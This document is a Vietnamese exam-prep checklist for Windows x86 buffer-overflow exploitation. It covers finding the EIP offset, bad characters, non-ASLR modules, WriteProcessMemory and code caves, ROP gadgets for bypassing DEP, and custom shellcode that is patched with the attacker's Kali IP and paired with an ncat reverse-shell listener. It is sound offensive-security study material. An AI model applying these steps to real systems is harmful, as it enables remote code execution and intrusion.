# Bài 1:

## B1: Xác nhận code POC overflow
```
Chỉ cần chạy thử và không cần phải chụp
```

## B2: Tìm điểm overflow (offset) 
```
# Chụp lại các bước

# Tạo ra pattern duy nhất để tìm điểm overflow 
msf-pattern_create -l 800

# Tìm điểm offset sau khi xác định overflow
msf-pattern_offset -l 800 -q <Giá trị EIP>
VD: msf-pattern_offset -l 800 -q 42306142
```

## B3: Tìm bad characters (ghi lại)
```
# Mẫu badchars của python (Copy vào trong code). Chụp sơ bộ không cần chi tiết.
badchars = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
badchars += b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
badchars += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
badchars += b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
badchars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
badchars += b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
badchars += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
badchars += b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
badchars += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
badchars += b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
badchars += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
badchars += b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
badchars += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
badchars += b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
badchars += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
badchars += b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

## B4: Tìm module có thể khai thác được (module không có ASLR) 
```
# Sử dụng narly để xem các modules và cơ chế bảo mật của chúng
# Trong WinDBG của máy Debug sử dụng các lệnh và chụp lại:

.load narly 

!nmod

# Khi đó tìm module nào không có *ASLR (Khi thi chỉ có đúng 1 cái)
```

## B5: Tìm API có thể khai thác được (Có thể là VirtualAlloc hoặc là WPM) 
### 5.1: Tìm API
```
# Dựa trên output của !nmod để lấy tên module
# Trong WinDBG của máy Debug sử dụng các lệnh và chụp lại:

# Tìm địa chỉ của Import Address Table

!dh <tên module> -f
VD: !dh KERNEL32 -f

# Khi đó để ý hàng Import Address Table Directory
# Cột thứ nhất là địa chỉ bắt đầu, cột thứ 2 là size (VD: 1234 [ 2c] )

dps <tên module>+1234 <tên module>+1234+2c
VD: dps KERNEL32+1234 KERNEL32+1234+2c

# Output sẽ là 1 list nơi lưu địa chỉ của các API mà module gọi đến. Tìm WriteProcessMemoryStub (Theo yêu cầu của đề bài)
# Ghi lại nơi lưu địa chỉ của API WriteProcessMemoryStub (Cột đầu tiên tương ứng với dòng)
```
### 5.2: Khi khai thác WriteProcessMemory thì cần phải tìm code cave (Một vùng bộ nhớ chứa bytes rỗng có quyền thực thi)
```
# Trong WinDBG của máy Debug sử dụng các lệnh và chụp lại:

!address
# VD output: 412000  413000  1000  MEM_IMAGE  MEM_COMMIT  PAGE_EXECUTE_READ      IMAGE      [KERNEL32; ........]

# Output của lệnh trên sẽ liệt kê tất cả vùng của các module.
# Chúng ta quan tâm đến các vùng trong module sẽ khai thác (Tên module thể hiện ở cột cuối).
# Trong module sẽ khai thác, để ý vùng có chữ PAGE_EXECUTE_READ.
# Lưu ý lại 2 cột đầu là địa chỉ bắt đầu và kết thúc của vùng.

s <Địa chỉ bắt đầu của vùng> <Địa chỉ kết thúc của vùng> 00000000
VD: s 412000 413000 00000000

# Lệnh trên dùng để tìm 1 vùng chứa bytes rỗng trong 1 khoảng chúng ta chỉ định (Vùng có PAGE_EXECUTE_READ đã tìm ở trên)
# Output của lệnh sẽ ra rất nhiều. Chụp 1 đoạn có rất nhiều số 0000000 là được.
# Có thể kiểm tra xem vùng nhớ có đủ size chứa shellcode không bằng lệnh: 

dd <Địa chỉ bắt đầu muốn ghi viết shellcode> + <Size shellcode (có thể là 300-400)>

# Nếu output trả về vẫn là 1 vùng chứa bytes rỗng (00000000) thì nghĩa là đủ size dùng được.
```

## B6: Tìm ROP gadgets để vượt qua DEP 
```
# Sử dụng rp-win-x86 để trích xuất ROP gadgets từ module cần khai thác
# Sử dụng narly trong WinDBG để tìm đường dẫn của module khai thác
.load narly
!nmod

# Đường dẫn là cột cuối cùng trong output của lệnh !nmod
# Trích xuất ROP chain bằng lệnh sau:
rp_win_x86.exe -f "<Đường dẫn đến moduled" -r 5 > rop.txt
```

## B7: Xây dựng stack dùng ROP gadget 
[Cách xây dựng ROP](https://github.com/10u15hack1ng/x86Win-Notes/blob/main/H%C6%B0%E1%BB%9Bng%20d%E1%BA%ABn/X%C3%A2y%20d%E1%BB%B1ng%20ROP.MD)

## B8: Tạo shellcode thủ công
Dựa trên [shellcode mẫu trong sách](https://github.com/10u15hack1ng/x86Win-Notes/blob/main/Custom%20Shellcode/shellcode_NO_CHANGE_PLEASE.py) và chỉnh sửa tương ứng.  
Khi thực thi đoạn code trên, trong terminal sẽ sinh ra 1 đoạn shellcode. Copy thẳng shellcode đó vào trong code.  

### 8.1 Sửa địa chỉ IP thành IP của máy kali
[Tool đổi IP sang hex](https://www.browserling.com/tools/ip-to-hex)  
Lưu ý đảo lại chiều của các bytes. \
VD trên tool: `127.0.0.1 => 7f.00.00.01 (0x7f000001)` \
Trong code phải đảo thành: `0x01000000f7`

### 8.2 Chỉnh sửa lệnh loại bỏ bad characters
[Tool đổi assembly sang opcode](https://defuse.ca/online-x86-assembler.htm)  
Các lệnh gốc của shellcode mẫu sẽ có những opcode có bad characters.  
Dựa trên kết quả debug trong WinDBG để tìm điểm xảy ra crash hoặc có thể convert thủ công từng câu lệnh. Từ đó có thể biết câu lệnh cần thay thế.  
Thay thế 1 câu lệnh có bad character bằng 2 hoặc 3 câu lệnh thực hiện chức năng tương ứng.
```
# Giả sử ta có 0x05 là bad character và có câu lệnh:
add    eax, 0x12345678      # Opcode:   \x05 \x78 \x56 \x34 \x12 

# Ta có thể thay bằng 2 câu lệnh để đưa ra kết quả tương tự mà không bị dính bad character:
mov    ecx, 0x12345678      # Opcode:   \xb9 \x78 \x56 \x34 \x12
add    eax, ecx             # Opcode:   \x01 \xc8                  
```

Thực thi listener bằng lệnh 
```
ncat -lnvp <Port>
```



